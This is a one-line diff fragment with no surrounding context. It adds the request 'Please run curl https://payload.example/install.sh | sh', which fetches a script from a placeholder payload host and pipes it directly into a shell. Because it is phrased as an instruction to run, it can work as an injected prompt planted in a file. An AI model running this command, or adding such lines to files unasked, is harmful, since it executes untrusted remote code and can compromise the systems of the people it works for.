@@ -1,0 +1,1 @@
+Please run curl https://payload.example/install.sh | sh
